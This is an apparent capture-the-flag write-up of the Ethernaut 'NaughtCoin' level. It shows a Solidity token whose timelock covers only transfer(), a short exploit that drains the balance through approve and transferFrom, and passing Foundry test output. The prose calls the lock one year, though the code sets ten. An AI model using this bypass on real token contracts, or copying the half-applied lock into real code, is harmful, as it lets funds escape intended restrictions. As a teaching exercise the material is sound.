###########################
Ethernaut 15: NaughtCoin
###########################
:date: 2023-09-10
:slug: ethernaut-15-naughtcoin
:summary: read what you extend folks
:tags: 
:author: capu
:featured_image:


Objective
=========
Get the player's balance to zero.

Code
====
.. code-block:: solidity
    :linenos: inline
    :hl_lines: 5 21 29

    contract NaughtCoin is ERC20 {
        // string public constant name = 'NaughtCoin';
        // string public constant symbol = '0x0';
        // uint public constant decimals = 18;
        uint256 public timeLock = block.timestamp + 10 * 365 days;
        uint256 public INITIAL_SUPPLY;
        address public player;

        constructor(address _player) ERC20("NaughtCoin", "0x0") {
            player = _player;
            INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
            // _totalSupply = INITIAL_SUPPLY;
            // _balances[player] = INITIAL_SUPPLY;
            _mint(player, INITIAL_SUPPLY);
            emit Transfer(address(0), player, INITIAL_SUPPLY);
        }

        function transfer(
            address _to,
            uint256 _value
        ) public override lockTokens returns (bool) {
            return super.transfer(_to, _value);
        }

        // Prevent the initial owner from transferring
        // tokens until the timelock has passed
        modifier lockTokens() {
            if (msg.sender == player) {
                require(block.timestamp > timeLock);
                _;
            } else {
                _;
            }
        }
    }

This contract has a timelock, preventing the user from transferring tokens out
until a year from deployment.

Solution
========

The ERC20 standard has two ways to move tokens:

- ``transferFrom``
- ``transfer``

and only the latter is overriden from the default implementation to prevent
funds moving before the timelock elapses. Therefore, using the ``transferFrom``
method is enough to get around it.

.. code-block:: solidity 

    function solution(address payable target_) internal override{
        uint256 amount = 1000000 * (10 ** 18);
        NaughtCoin target = NaughtCoin(target_);
        target.approve(attacker, amount);
        target.transferFrom(attacker, address(this), amount);
    }

.. code-block:: plain

    [I] () capu ~/s/ethernaut-solutions (master)> forge test --mc NaughtCoin
    [⠆] Compiling...
    No files changed, compilation skipped

    Running 1 test for test/15-NaughtCoin.t.sol:NaughtCoinSolution
    [PASS] testSolution() (gas: 4009231)
    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.44ms
    Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)


😎
